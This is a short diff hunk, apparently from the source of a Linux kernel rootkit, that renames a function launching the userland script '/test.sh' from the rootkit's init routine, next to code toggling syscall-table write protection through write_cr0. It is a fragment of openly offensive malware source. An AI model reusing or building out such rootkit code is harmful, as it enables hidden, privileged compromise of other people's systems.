@@ -230,7 +230,7 @@ int rootkit_init(void) { // Start lel rootkit
 
 	write_cr0(read_cr0() | 0x10000); // Turn off memory write to syscall table
 
-	start_bin_from_user("/test.sh");
+	start_bin_from_userland("/test.sh");
 
 	return 0;
 }
